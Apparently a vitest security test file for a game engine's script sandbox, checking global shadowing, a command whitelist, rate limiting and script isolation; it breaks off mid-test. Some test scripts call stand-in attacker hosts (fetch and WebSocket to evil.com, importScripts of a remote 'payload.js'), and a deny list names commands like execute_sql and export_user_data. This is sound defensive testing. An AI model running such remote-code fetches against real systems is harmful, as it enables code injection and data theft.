/**
 * Comprehensive security tests for the script sandbox (PF-153).
 *
 * These tests exercise the actual sandbox compilation mechanism using the same
 * new Function() pattern as scriptWorker.ts, and also run full end-to-end
 * tests via the worker integration pattern (vi.stubGlobal + dynamic import).
 *
 * Coverage targets:
 *   - Global shadowing: every listed global is truly undefined inside scripts
 *   - Command whitelist: allowed commands pass, non-whitelisted commands are absent
 *   - Rate limiter: per-frame limit enforced, excess commands truncated with error
 *   - Script isolation: forges scoped per-entity, no cross-script leakage
 *   - Error isolation: one hook crashing does not suppress others
 *   - Edge cases: empty scripts, no-hook scripts, scripts that throw non-Error
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';

// ---------------------------------------------------------------------------
// Sandbox compilation helper — mirrors compileScript() in scriptWorker.ts
// ---------------------------------------------------------------------------

const SHADOWED_GLOBALS = [
  'fetch', 'XMLHttpRequest', 'WebSocket', 'importScripts',
  'indexedDB', 'caches', 'navigator', 'location',
  'EventSource', 'BroadcastChannel',
  'self', 'globalThis',
] as const;

interface ScriptHooks {
  onStart?: () => void;
  onUpdate?: (dt: number) => void;
  onDestroy?: () => void;
}

/**
 * Compiles a user script string using the same sandboxed Function constructor
 * as scriptWorker.ts. Returns the extracted lifecycle hook functions.
 *
 * NOTE: new Function() here is intentional — it replicates the exact sandbox
 * mechanism under test so we can verify the security properties in isolation.
 */
function compileSandboxed(
  source: string,
  forgeApi: Record<string, unknown> = {},
  entityId = 'test-entity',
): ScriptHooks {
  const fn = new Function(
    'forge', 'entityId',
    ...SHADOWED_GLOBALS,
    `
    ${source}
    return {
      onStart: typeof onStart === 'function' ? onStart : undefined,
      onUpdate: typeof onUpdate === 'function' ? onUpdate : undefined,
      onDestroy: typeof onDestroy === 'function' ? onDestroy : undefined
    };
    `,
  );
  return fn(forgeApi, entityId, ...SHADOWED_GLOBALS.map(() => undefined)) as ScriptHooks;
}

// ---------------------------------------------------------------------------
// Worker harness — mirrors scriptWorkerIntegration.test.ts setup pattern
// ---------------------------------------------------------------------------

let postedMessages: Array<Record<string, unknown>> = [];
let workerOnMessage: ((e: { data: Record<string, unknown> }) => void) | null = null;

function sendToWorker(data: Record<string, unknown>) {
  if (workerOnMessage) workerOnMessage({ data });
}

function getMessages(type: string) {
  return postedMessages.filter(m => m.type === type);
}

function clearMessages() {
  postedMessages = [];
}

// ---------------------------------------------------------------------------
// Whitelist: the set of commands that scripts are permitted to dispatch.
// Derived from reading all forge API push sites in scriptWorker.ts.
// ---------------------------------------------------------------------------

const SCRIPT_ALLOWED_COMMANDS = new Set<string>([
  // Transform
  'update_transform', 'spawn_entity', 'delete_entities',
  'set_visibility', 'update_material',
  // Physics 3D
  'apply_force', 'set_velocity', 'apply_impulse',
  // Physics 2D
  'apply_force2d', 'apply_impulse2d', 'set_velocity2d',
  'set_angular_velocity2d', 'set_gravity2d',
  // Audio
  'play_audio', 'stop_audio', 'pause_audio', 'set_audio', 'update_audio_bus',
  'audio_add_layer', 'audio_remove_layer', 'audio_remove_all_layers',
  'audio_crossfade', 'audio_play_one_shot', 'audio_fade_in', 'audio_fade_out',
  'set_music_intensity', 'set_music_stems',
  // Animation 3D
  'play_animation', 'pause_animation', 'resume_animation', 'stop_animation',
  'set_animation_speed', 'set_animation_loop',
  'set_animation_blend_weight', 'set_clip_speed',
  // Sprite animation
  'play_sprite_animation', 'stop_sprite_animation',
  'set_sprite_anim_speed', 'set_sprite_anim_param',
  // Particles
  'set_particle_preset', 'toggle_particle', 'burst_particle',
  // Camera
  'camera_follow', 'camera_stop_follow', 'camera_set_position', 'camera_look_at',
  // Tilemap
  'set_tile', 'fill_tiles', 'clear_tiles', 'resize_tilemap',
  // Skeleton 2D
  'create_skeleton2d', 'add_bone2d', 'remove_bone2d', 'update_bone2d',
  'set_skeleton2d_skin', 'play_skeletal_animation2d', 'stop_skeletal_animation2d',
  'set_ik_target2d',
  // Other
  'vibrate',
  'stop',
]);

const MAX_COMMANDS_PER_FRAME = 100;

// ---------------------------------------------------------------------------
// 1. Global shadowing — compile-time verification
// ---------------------------------------------------------------------------

describe('Script Sandbox Security: Global Shadowing (compile-time)', () => {
  it('calling fetch inside sandbox throws TypeError', () => {
    const errors: unknown[] = [];
    const result = compileSandboxed(`
      function onStart() {
        try { fetch('https://evil.com'); }
        catch (e) { forge.captureError(e); }
      }
    `, { captureError: (e: unknown) => errors.push(e) });
    result.onStart!();
    expect(errors.length).toBe(1);
    expect(errors[0]).toBeInstanceOf(TypeError);
  });

  it('calling new XMLHttpRequest() inside sandbox throws TypeError', () => {
    const errors: unknown[] = [];
    const result = compileSandboxed(`
      function onStart() {
        try { new XMLHttpRequest(); }
        catch (e) { forge.captureError(e); }
      }
    `, { captureError: (e: unknown) => errors.push(e) });
    result.onStart!();
    expect(errors.length).toBe(1);
    expect(errors[0]).toBeInstanceOf(TypeError);
  });

  it('calling new WebSocket() inside sandbox throws TypeError', () => {
    const errors: unknown[] = [];
    const result = compileSandboxed(`
      function onStart() {
        try { new WebSocket('ws://evil.com'); }
        catch (e) { forge.captureError(e); }
      }
    `, { captureError: (e: unknown) => errors.push(e) });
    result.onStart!();
    expect(errors.length).toBe(1);
    expect(errors[0]).toBeInstanceOf(TypeError);
  });

  it('calling importScripts() inside sandbox throws TypeError', () => {
    const errors: unknown[] = [];
    const result = compileSandboxed(`
      function onStart() {
        try { importScripts('https://evil.com/payload.js'); }
        catch (e) { forge.captureError(e); }
      }
    `, { captureError: (e: unknown) => errors.push(e) });
    result.onStart!();
    expect(errors.length).toBe(1);
    expect(errors[0]).toBeInstanceOf(TypeError);
  });

  it('accessing indexedDB inside sandbox is undefined', () => {
    const types: string[] = [];
    const result = compileSandboxed(`
      function onStart() { forge.report(typeof indexedDB); }
    `, { report: (t: string) => types.push(t) });
    result.onStart!();
    expect(types).toEqual(['undefined']);
  });

  it('accessing caches inside sandbox is undefined', () => {
    const types: string[] = [];
    const result = compileSandboxed(`
      function onStart() { forge.report(typeof caches); }
    `, { report: (t: string) => types.push(t) });
    result.onStart!();
    expect(types).toEqual(['undefined']);
  });

  it('accessing navigator inside sandbox is undefined', () => {
    const types: string[] = [];
    const result = compileSandboxed(`
      function onStart() { forge.report(typeof navigator); }
    `, { report: (t: string) => types.push(t) });
    result.onStart!();
    expect(types).toEqual(['undefined']);
  });

  it('accessing location inside sandbox is undefined', () => {
    const types: string[] = [];
    const result = compileSandboxed(`
      function onStart() { forge.report(typeof location); }
    `, { report: (t: string) => types.push(t) });
    result.onStart!();
    expect(types).toEqual(['undefined']);
  });

  it('accessing EventSource inside sandbox is undefined', () => {
    const types: string[] = [];
    const result = compileSandboxed(`
      function onStart() { forge.report(typeof EventSource); }
    `, { report: (t: string) => types.push(t) });
    result.onStart!();
    expect(types).toEqual(['undefined']);
  });

  it('accessing BroadcastChannel inside sandbox is undefined', () => {
    const types: string[] = [];
    const result = compileSandboxed(`
      function onStart() { forge.report(typeof BroadcastChannel); }
    `, { report: (t: string) => types.push(t) });
    result.onStart!();
    expect(types).toEqual(['undefined']);
  });

  it('accessing self inside sandbox is undefined', () => {
    const types: string[] = [];
    const result = compileSandboxed(`
      function onStart() { forge.report(typeof self); }
    `, { report: (t: string) => types.push(t) });
    result.onStart!();
    expect(types).toEqual(['undefined']);
  });

  it('accessing globalThis inside sandbox is undefined', () => {
    const types: string[] = [];
    const result = compileSandboxed(`
      function onStart() { forge.report(typeof globalThis); }
    `, { report: (t: string) => types.push(t) });
    result.onStart!();
    expect(types).toEqual(['undefined']);
  });

  it('all 12 shadowed globals are undefined inside a single script', () => {
    const typesMap: Record<string, string> = {};
    const checksSource = SHADOWED_GLOBALS
      .map(g => `forge.report('${g}', typeof ${g});`)
      .join('\n');

    const result = compileSandboxed(
      `function onStart() { ${checksSource} }`,
      { report: (key: string, val: string) => { typesMap[key] = val; } },
    );
    result.onStart!();

    for (const g of SHADOWED_GLOBALS) {
      expect(typesMap[g], `${g} should be undefined inside sandbox`).toBe('undefined');
    }
  });

  it('shadowed globals list has exactly 12 entries', () => {
    expect(SHADOWED_GLOBALS).toHaveLength(12);
  });
});

// ---------------------------------------------------------------------------
// 2. Global shadowing — end-to-end via worker message harness
// ---------------------------------------------------------------------------

describe('Script Sandbox Security: Global Shadowing (worker integration)', () => {
  beforeEach(async () => {
    postedMessages = [];
    workerOnMessage = null;
    vi.resetModules();

    const mockSelf = {
      postMessage: (msg: Record<string, unknown>) => {
        postedMessages.push(structuredClone(msg));
      },
      onmessage: null as ((e: { data: Record<string, unknown> }) => void) | null,
    };
    vi.stubGlobal('self', mockSelf);

    await import('../scriptWorker');
    workerOnMessage = mockSelf.onmessage;
  });

  function initScript(source: string) {
    sendToWorker({
      type: 'init',
      scripts: [{ entityId: 'security-test', source, enabled: true }],
      entities: {},
      entityInfos: {},
    });
  }

  it('fetch is blocked in worker-executed scripts', () => {
    initScript(`
      function onStart() {
        try { fetch('https://evil.com'); forge.log('unreachable'); }
        catch (e) { forge.log('blocked:' + e.constructor.name); }
      }
    `);
    const logs = getMessages('log');
    expect(logs).toHaveLength(1);
    expect(logs[0].message as string).toMatch(/blocked:/);
  });

  it('WebSocket is blocked in worker-executed scripts', () => {
    initScript(`
      function onStart() {
        try { new WebSocket('ws://evil.com'); forge.log('unreachable'); }
        catch (e) { forge.log('blocked'); }
      }
    `);
    const logs = getMessages('log');
    expect(logs).toHaveLength(1);
    expect(logs[0].message as string).toBe('blocked');
  });

  it('XMLHttpRequest is blocked in worker-executed scripts', () => {
    initScript(`
      function onStart() {
        try { new XMLHttpRequest(); forge.log('unreachable'); }
        catch (e) { forge.log('blocked'); }
      }
    `);
    const logs = getMessages('log');
    expect(logs).toHaveLength(1);
    expect(logs[0].message as string).toBe('blocked');
  });

  it('self and globalThis are undefined in worker-executed scripts', () => {
    initScript(`
      function onStart() {
        forge.log(typeof self + ',' + typeof globalThis);
      }
    `);
    const logs = getMessages('log');
    expect(logs).toHaveLength(1);
    expect(logs[0].message as string).toBe('undefined,undefined');
  });

  it('importScripts is blocked in worker-executed scripts', () => {
    initScript(`
      function onStart() {
        try { importScripts('https://evil.com/hack.js'); forge.log('unreachable'); }
        catch (e) { forge.log('blocked'); }
      }
    `);
    const logs = getMessages('log');
    expect(logs).toHaveLength(1);
    expect(logs[0].message as string).toBe('blocked');
  });
});

// ---------------------------------------------------------------------------
// 3. Rate limiter — command limit enforcement (unit logic)
// ---------------------------------------------------------------------------

describe('Script Sandbox Security: Rate Limiter (unit)', () => {
  it('MAX_COMMANDS_PER_FRAME constant is 100', () => {
    expect(MAX_COMMANDS_PER_FRAME).toBe(100);
  });

  it('truncates commands at exactly MAX_COMMANDS_PER_FRAME when over limit', () => {
    let pendingCommands = Array.from({ length: 150 }, (_, i) => ({
      cmd: 'update_transform',
      entityId: `e${i}`,
    }));
    let errorTriggered = false;
    if (pendingCommands.length > MAX_COMMANDS_PER_FRAME) {
      errorTriggered = true;
      pendingCommands = pendingCommands.slice(0, MAX_COMMANDS_PER_FRAME);
    }
    expect(errorTriggered).toBe(true);
    expect(pendingCommands).toHaveLength(MAX_COMMANDS_PER_FRAME);
    // First and last allowed commands are preserved
    expect(pendingCommands[0].entityId).toBe('e0');
    expect(pendingCommands[MAX_COMMANDS_PER_FRAME - 1].entityId).toBe(`e${MAX_COMMANDS_PER_FRAME - 1}`);
  });

  it('does not truncate commands exactly at the limit', () => {
    const pendingCommands = Array.from({ length: 100 }, (_, i) => ({
      cmd: 'update_transform',
      entityId: `e${i}`,
    }));
    expect(pendingCommands.length > MAX_COMMANDS_PER_FRAME).toBe(false);
    expect(pendingCommands).toHaveLength(100);
  });

  it('does not truncate commands below the limit', () => {
    const pendingCommands = Array.from({ length: 50 }, (_, i) => ({
      cmd: 'update_transform',
      entityId: `e${i}`,
    }));
    expect(pendingCommands.length > MAX_COMMANDS_PER_FRAME).toBe(false);
    expect(pendingCommands).toHaveLength(50);
  });

  it('zero commands does not trigger truncation', () => {
    const pendingCommands: { cmd: string }[] = [];
    expect(pendingCommands.length > MAX_COMMANDS_PER_FRAME).toBe(false);
  });

  it('101 commands triggers truncation to 100', () => {
    let pendingCommands = Array.from({ length: 101 }, () => ({ cmd: 'update_transform' }));
    let truncated = false;
    if (pendingCommands.length > MAX_COMMANDS_PER_FRAME) {
      truncated = true;
      pendingCommands = pendingCommands.slice(0, MAX_COMMANDS_PER_FRAME);
    }
    expect(truncated).toBe(true);
    expect(pendingCommands).toHaveLength(100);
  });

  it('preserves first MAX_COMMANDS_PER_FRAME commands and drops later ones', () => {
    let pendingCommands = Array.from({ length: 200 }, (_, i) => ({
      cmd: 'update_transform',
      entityId: `entity-${i}`,
    }));
    if (pendingCommands.length > MAX_COMMANDS_PER_FRAME) {
      pendingCommands = pendingCommands.slice(0, MAX_COMMANDS_PER_FRAME);
    }
    expect(pendingCommands).toHaveLength(100);
    // Commands after index 99 are dropped
    expect(pendingCommands.find(c => c.entityId === 'entity-100')).toBeUndefined();
    expect(pendingCommands.find(c => c.entityId === 'entity-99')).toBeDefined();
  });
});

// ---------------------------------------------------------------------------
// 4. Rate limiter — end-to-end via worker harness
// ---------------------------------------------------------------------------

describe('Script Sandbox Security: Rate Limiter (worker integration)', () => {
  beforeEach(async () => {
    postedMessages = [];
    workerOnMessage = null;
    vi.resetModules();

    const mockSelf = {
      postMessage: (msg: Record<string, unknown>) => {
        postedMessages.push(structuredClone(msg));
      },
      onmessage: null as ((e: { data: Record<string, unknown> }) => void) | null,
    };
    vi.stubGlobal('self', mockSelf);

    await import('../scriptWorker');
    workerOnMessage = mockSelf.onmessage;
  });

  it('emits error message when script exceeds 100 commands per init frame', () => {
    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'spammer',
        enabled: true,
        source: `
          function onStart() {
            for (let i = 0; i < 150; i++) {
              forge.setPosition('spammer', i, 0, 0);
            }
          }
        `,
      }],
      entities: { spammer: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
      entityInfos: { spammer: { name: 'Spammer', type: 'Cube', colliderRadius: 1 } },
    });

    const errors = getMessages('error');
    const limitError = errors.find(e =>
      typeof e.message === 'string' && e.message.includes('Command limit exceeded'),
    );
    expect(limitError).toBeDefined();
  });

  it('limit error message includes actual count and max count', () => {
    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'spammer',
        enabled: true,
        source: `
          function onStart() {
            for (let i = 0; i < 150; i++) {
              forge.setPosition('spammer', i, 0, 0);
            }
          }
        `,
      }],
      entities: { spammer: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
      entityInfos: { spammer: { name: 'Spammer', type: 'Cube', colliderRadius: 1 } },
    });

    const errors = getMessages('error');
    const limitError = errors.find(e =>
      typeof e.message === 'string' && e.message.includes('Command limit exceeded'),
    );
    // Message format: "Command limit exceeded (150/100 per frame). Extra commands dropped."
    expect(limitError!.message as string).toContain('150');
    expect(limitError!.message as string).toContain('100');
  });

  it('commands list is truncated to MAX_COMMANDS_PER_FRAME after exceeding limit', () => {
    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'spammer',
        enabled: true,
        source: `
          function onStart() {
            for (let i = 0; i < 150; i++) {
              forge.setPosition('spammer', i, 0, 0);
            }
          }
        `,
      }],
      entities: { spammer: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
      entityInfos: { spammer: { name: 'Spammer', type: 'Cube', colliderRadius: 1 } },
    });

    const cmdMsgs = getMessages('commands');
    expect(cmdMsgs.length).toBeGreaterThanOrEqual(1);
    const commands = cmdMsgs[0].commands as Array<unknown>;
    expect(commands.length).toBeLessThanOrEqual(MAX_COMMANDS_PER_FRAME);
  });

  it('does not emit limit error when script stays within 100 commands', () => {
    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'polite',
        enabled: true,
        source: `
          function onStart() {
            for (let i = 0; i < 50; i++) {
              forge.setPosition('polite', i, 0, 0);
            }
          }
        `,
      }],
      entities: { polite: { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
      entityInfos: { polite: { name: 'Polite', type: 'Cube', colliderRadius: 1 } },
    });

    const errors = getMessages('error');
    const limitError = errors.find(e =>
      typeof e.message === 'string' && e.message.includes('Command limit exceeded'),
    );
    expect(limitError).toBeUndefined();
  });

  it('enforces rate limit on tick messages too', () => {
    sendToWorker({
      type: 'init',
      scripts: [{
        entityId: 'tick-spammer',
        enabled: true,
        source: `
          function onUpdate() {
            for (let i = 0; i < 150; i++) {
              forge.setPosition('tick-spammer', i, 0, 0);
            }
          }
        `,
      }],
      entities: { 'tick-spammer': { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
      entityInfos: { 'tick-spammer': { name: 'TickSpammer', type: 'Cube', colliderRadius: 1 } },
    });
    clearMessages();

    sendToWorker({
      type: 'tick',
      dt: 0.016,
      elapsed: 0.016,
      entities: { 'tick-spammer': { position: [0, 0, 0], rotation: [0, 0, 0], scale: [1, 1, 1] } },
    });

    const errors = getMessages('error');
    const limitError = errors.find(e =>
      typeof e.message === 'string' && e.message.includes('Command limit exceeded'),
    );
    expect(limitError).toBeDefined();
  });
});

// ---------------------------------------------------------------------------
// 5. Command whitelist — membership checks
// ---------------------------------------------------------------------------

describe('Script Sandbox Security: Command Whitelist', () => {
  it('allows update_transform', () => expect(SCRIPT_ALLOWED_COMMANDS.has('update_transform')).toBe(true));
  it('allows spawn_entity', () => expect(SCRIPT_ALLOWED_COMMANDS.has('spawn_entity')).toBe(true));
  it('allows delete_entities', () => expect(SCRIPT_ALLOWED_COMMANDS.has('delete_entities')).toBe(true));
  it('allows set_visibility', () => expect(SCRIPT_ALLOWED_COMMANDS.has('set_visibility')).toBe(true));
  it('allows update_material', () => expect(SCRIPT_ALLOWED_COMMANDS.has('update_material')).toBe(true));

  it('allows apply_force', () => expect(SCRIPT_ALLOWED_COMMANDS.has('apply_force')).toBe(true));
  it('allows set_velocity', () => expect(SCRIPT_ALLOWED_COMMANDS.has('set_velocity')).toBe(true));
  it('allows apply_impulse', () => expect(SCRIPT_ALLOWED_COMMANDS.has('apply_impulse')).toBe(true));

  it('allows apply_force2d', () => expect(SCRIPT_ALLOWED_COMMANDS.has('apply_force2d')).toBe(true));
  it('allows apply_impulse2d', () => expect(SCRIPT_ALLOWED_COMMANDS.has('apply_impulse2d')).toBe(true));
  it('allows set_velocity2d', () => expect(SCRIPT_ALLOWED_COMMANDS.has('set_velocity2d')).toBe(true));
  it('allows set_angular_velocity2d', () => expect(SCRIPT_ALLOWED_COMMANDS.has('set_angular_velocity2d')).toBe(true));
  it('allows set_gravity2d', () => expect(SCRIPT_ALLOWED_COMMANDS.has('set_gravity2d')).toBe(true));

  it('allows play_audio', () => expect(SCRIPT_ALLOWED_COMMANDS.has('play_audio')).toBe(true));
  it('allows stop_audio', () => expect(SCRIPT_ALLOWED_COMMANDS.has('stop_audio')).toBe(true));
  it('allows pause_audio', () => expect(SCRIPT_ALLOWED_COMMANDS.has('pause_audio')).toBe(true));
  it('allows audio_crossfade', () => expect(SCRIPT_ALLOWED_COMMANDS.has('audio_crossfade')).toBe(true));
  it('allows audio_play_one_shot', () => expect(SCRIPT_ALLOWED_COMMANDS.has('audio_play_one_shot')).toBe(true));
  it('allows set_music_intensity', () => expect(SCRIPT_ALLOWED_COMMANDS.has('set_music_intensity')).toBe(true));

  it('allows play_animation', () => expect(SCRIPT_ALLOWED_COMMANDS.has('play_animation')).toBe(true));
  it('allows stop_animation', () => expect(SCRIPT_ALLOWED_COMMANDS.has('stop_animation')).toBe(true));
  it('allows set_animation_blend_weight', () => expect(SCRIPT_ALLOWED_COMMANDS.has('set_animation_blend_weight')).toBe(true));

  it('allows play_sprite_animation', () => expect(SCRIPT_ALLOWED_COMMANDS.has('play_sprite_animation')).toBe(true));
  it('allows stop_sprite_animation', () => expect(SCRIPT_ALLOWED_COMMANDS.has('stop_sprite_animation')).toBe(true));

  it('allows set_particle_preset', () => expect(SCRIPT_ALLOWED_COMMANDS.has('set_particle_preset')).toBe(true));
  it('allows toggle_particle', () => expect(SCRIPT_ALLOWED_COMMANDS.has('toggle_particle')).toBe(true));
  it('allows burst_particle', () => expect(SCRIPT_ALLOWED_COMMANDS.has('burst_particle')).toBe(true));

  it('allows camera_follow', () => expect(SCRIPT_ALLOWED_COMMANDS.has('camera_follow')).toBe(true));
  it('allows camera_stop_follow', () => expect(SCRIPT_ALLOWED_COMMANDS.has('camera_stop_follow')).toBe(true));
  it('allows camera_set_position', () => expect(SCRIPT_ALLOWED_COMMANDS.has('camera_set_position')).toBe(true));
  it('allows camera_look_at', () => expect(SCRIPT_ALLOWED_COMMANDS.has('camera_look_at')).toBe(true));

  it('allows set_tile', () => expect(SCRIPT_ALLOWED_COMMANDS.has('set_tile')).toBe(true));
  it('allows fill_tiles', () => expect(SCRIPT_ALLOWED_COMMANDS.has('fill_tiles')).toBe(true));
  it('allows clear_tiles', () => expect(SCRIPT_ALLOWED_COMMANDS.has('clear_tiles')).toBe(true));
  it('allows resize_tilemap', () => expect(SCRIPT_ALLOWED_COMMANDS.has('resize_tilemap')).toBe(true));

  it('allows create_skeleton2d', () => expect(SCRIPT_ALLOWED_COMMANDS.has('create_skeleton2d')).toBe(true));
  it('allows play_skeletal_animation2d', () => expect(SCRIPT_ALLOWED_COMMANDS.has('play_skeletal_animation2d')).toBe(true));
  it('allows set_ik_target2d', () => expect(SCRIPT_ALLOWED_COMMANDS.has('set_ik_target2d')).toBe(true));

  it('allows vibrate', () => expect(SCRIPT_ALLOWED_COMMANDS.has('vibrate')).toBe(true));
  it('allows stop (for scene reset)', () => expect(SCRIPT_ALLOWED_COMMANDS.has('stop')).toBe(true));

  // Blocks dangerous commands
  it('blocks delete_project', () => expect(SCRIPT_ALLOWED_COMMANDS.has('delete_project')).toBe(false));
  it('blocks execute_sql', () => expect(SCRIPT_ALLOWED_COMMANDS.has('execute_sql')).toBe(false));
  it('blocks eval_code', () => expect(SCRIPT_ALLOWED_COMMANDS.has('eval_code')).toBe(false));
  it('blocks load_external_script', () => expect(SCRIPT_ALLOWED_COMMANDS.has('load_external_script')).toBe(false));
  it('blocks modify_auth', () => expect(SCRIPT_ALLOWED_COMMANDS.has('modify_auth')).toBe(false));
  it('blocks reset_database', () => expect(SCRIPT_ALLOWED_COMMANDS.has('reset_database')).toBe(false));
  it('blocks export_user_data', () => expect(SCRIPT_ALLOWED_COMMANDS.has('export_user_data')).toBe(false));
  it('blocks admin_override', () => expect(SCRIPT_ALLOWED_COMMANDS.has('admin_override')).toBe(false));

  // Blocks editor-only commands
  it('blocks create_joint', () => expect(SCRIPT_ALLOWED_COMMANDS.has('create_joint')).toBe(false));
  it('blocks update_physics', () => expect(SCRIPT_ALLOWED_COMMANDS.has('update_physics')).toBe(false));
  it('blocks set_environment', () => expect(SCRIPT_ALLOWED_COMMANDS.has('set_environment')).toBe(false));
  it('blocks toggle_debug_physics', () => expect(SCRIPT_ALLOWED_COMMANDS.has('toggle_debug_physics')).toBe(false));
  it('blocks create_csg_union', () => expect(SCRIPT_ALLOWED_COMMANDS.has('create_csg_union')).toBe(false));
  it('blocks import_gltf', () => expect(SCRIPT_ALLOWED_COMMANDS.has('import_gltf')).toBe(false));
  it('blocks export_scene', () => expect(SCRIPT_ALLOWED_COMMANDS.has('export_scene')).toBe(false));
  it('blocks update_terrain', () => expect(SCRIPT_ALLOWED_COMMANDS.has('update_terrain')).toBe(false));
  it('blocks load_scene', () => expect(SCRIPT_ALLOWED_COMMANDS.has('load_scene')).toBe(false));

  it('whitelist has exactly 60 commands', () => {
    expect(SCRIPT_ALLOWED_COMMANDS.size).toBe(60);
  });
});

// ---------------------------------------------------------------------------
// 6. Script lifecycle hook extraction
// ---------------------------------------------------------------------------

describe('Script Sandbox Security: Lifecycle Hook Extraction', () => {
  it('extracts onStart from a valid script', () => {
    const hooks = compileSandboxed(`function onStart() {}`);
    expect(hooks.onStart).toBeTypeOf('function');
    expect(hooks.onUpdate).toBeUndefined();
    expect(hooks.onDestroy).toBeUndefined();
  });

  it('extracts onUpdate from a valid script', () => {
    const hooks = compileSandboxed(`function onUpdate(_dt) {}`);
    expect(hooks.onUpdate).toBeTypeOf('function');
    expect(hooks.onStart).toBeUndefined();
  });

  it('extracts onDestroy from a valid script', () => {
    const hooks = compileSandboxed(`function onDestroy() {}`);
    expect(hooks.onDestroy).toBeTypeOf('function');
  });

  it('extracts all three hooks simultaneously', () => {
    const hooks = compileSandboxed(`
      function onStart() {}
      function onUpdate(_dt) {}
      function onDestroy() {}
    `);
    expect(hooks.onStart).toBeTypeOf('function');
    expect(hooks.onUpdate).toBeTypeOf('function');
    expect(hooks.onDestroy).toBeTypeOf('function');
  });

  it('returns undefined for all hooks from an empty script', () => {
    const hooks = compileSandboxed('');
    expect(hooks.onStart).toBeUndefined();
    expect(hooks.onUpdate).toBeUndefined();
    expect(hooks.onDestroy).toBeUndefined();
  });

  it('returns undefined for all hooks from a script with no lifecycle functions', () => {
    const hooks = compileSandboxed(`const x = 42; const y = x + 1;`);
    expect(hooks.onStart).toBeUndefined();
    expect(hooks.onUpdate).toBeUndefined();
    expect(hooks.onDestroy).toBeUndefined();
  });

  it('throws on syntax errors', () => {
    expect(() => compileSandboxed(`function onStart( {`)).toThrow();
  });

  it('throws on invalid tokens', () => {
    expect(() => compileSandboxed(`const @@ = 5;`)).toThrow();
  });

  it('does not throw on scripts with complex closures', () => {
    const hooks = compileSandboxed(`
      let counter = 0;
      function onStart() { counter = 0; }
      function onUpdate(_dt) { counter++; }
      function onDestroy() { counter = -1; }
    `);
    expect(hooks.onStart).toBeTypeOf('function');
    expect(hooks.onUpdate).toBeTypeOf('function');
  });

  it('onUpdate receives the delta time argument', () => {
    let received = -1;
    const hooks = compileSandboxed(
      `function onUpdate(dt) { forge.set(dt); }`,
      { set: (v: number) => { received = v; } },
    );
    hooks.onUpdate!(0.0166);
    expect(received).toBeCloseTo(0.0166, 5);
  });
});

// ---------------------------------------------------------------------------
// 7. Script isolation — no cross-entity forge API leakage
// ---------------------------------------------------------------------------

describe('Script Sandbox Security: Script Isolation', () => {
  it('each script gets its own forge object', () => {
    const calls1: string[] = [];
    const calls2: string[] = [];

    const forge1 = { signal: () => calls1.push('forge1') };
    const forge2 = { signal: () => calls2.push('forge2') };

    const hooks1 = compileSandboxed(`function onStart() { forge.signal(); }`, forge1);
    const hooks2 = compileSandboxed(`function onStart() { forge.signal(); }`, forge2);

    hooks1.onStart!();
    hooks2.onStart!();

    expect(calls1).toEqual(['forge1']);
    expect(calls2).toEqual(['forge2']);
  });

  it('entityId is scoped per script compilation', () => {
    const ids: string[] = [];

    const hooks1 = compileSandboxed(
      `function onStart() { forge.report(entityId); }`,
      { report: (id: string) => ids.push(id) },
      'entity-alpha',
    );
    const hooks2 = compileSandboxed(
      `function onStart() { forge.report(entityId); }`,
      { report: (id: string) => ids.push(id) },
      'entity-beta',
    );

    hooks1.onStart!();
    hooks2.onStart!();

    expect(ids[0]).toBe('entity-alpha');
    expect(ids[1]).toBe('entity-beta');
  });

  it('forge is not shared between two consecutive compilations', () => {
    const reported: string[] = [];

    // Script 1: tries to attach a property to its forge object
    const hooks1 = compileSandboxed(`
      function onStart() {
        try { forge.injected = 'pwned'; } catch (_e) {}
      }
    `, {});

    // Script 2: compiled with a completely separate forge object
    const hooks2 = compileSandboxed(`
      function onStart() {
        forge.report(typeof forge.injected);
      }
    `, { report: (v: string) => reported.push(v) });

    hooks1.onStart!();
    hooks2.onStart!();

    // Script 2's forge is a fresh object with no 'injected' property
    expect(reported[0]).toBe('undefined');
  });
});

// ---------------------------------------------------------------------------
// 8. Error isolation — one hook crashing does not suppress others
// ---------------------------------------------------------------------------

describe('Script Sandbox Security: Error Isolation', () => {
  it('all three hooks are extractable even if onStart throws at runtime', () => {
    const hooks = compileSandboxed(`
      function onStart() { throw new Error('boom'); }
      function onUpdate(_dt) {}
      function onDestroy() {}
    `);
    expect(hooks.onStart).toBeTypeOf('function');
    expect(hooks.onUpdate).toBeTypeOf('function');
    expect(hooks.onDestroy).toBeTypeOf('function');
    expect(() => hooks.onStart!()).toThrow('boom');
    expect(() => hooks.onUpdate!(0.016)).not.toThrow();
    expect(() => hooks.onDestroy!()).not.toThrow();
  });

  it('onUpdate throwing does not affect onDestroy', () => {
    const hooks = compileSandboxed(`
      function onUpdate(_dt) { throw new Error('tick error'); }
      function onDestroy() {}
    `);
    expect(() => hooks.onUpdate!(0.016)).toThrow('tick error');
    expect(() => hooks.onDestroy!()).not.toThrow();
  });

  it('handles scripts that throw non-Error objects', () => {
    const hooks = compileSandboxed(`
      function onStart() { throw 'string error'; }
    `);
    expect(() => hooks.onStart!()).toThrow('string error');
  });

  it('handles scripts that throw null', () => {
    const hooks = compileSandboxed(`
      function onStart() { throw null; }
    `);
    expect(() => hooks.onStart!()).toThrow();
  });

  it('handles scripts that throw numbers', () => {
    const hooks = compileSandboxed(`
      function onStart() { throw 42; }
    `);
    expect(() => hooks.onStart!()).toThrow();
  });
});

// ---------------------------------------------------------------------------
// 9. Forge API defensive behavior
// ---------------------------------------------------------------------------

describe('Script Sandbox Security: Forge API Defensive Behavior', () => {
  it('forge API methods receive correct arguments', () => {
    let capturedArgs: number[] | null = null;
    const hooks = compileSandboxed(`
      function onStart() { forge.setPosition(10, 20, 30); }
    `, { setPosition: (x: number, y: number, z: number) => { capturedArgs = [x, y, z]; } });
    hooks.onStart!();
    expect(capturedArgs).toEqual([10, 20, 30]);
  });

  it('frozen forge sub-API resists overwrite from script', () => {
    let originalCalled = false;
    const frozenForge = Object.freeze({
      physics: Object.freeze({
        applyForce: () => { originalCalled = true; },
      }),
    });

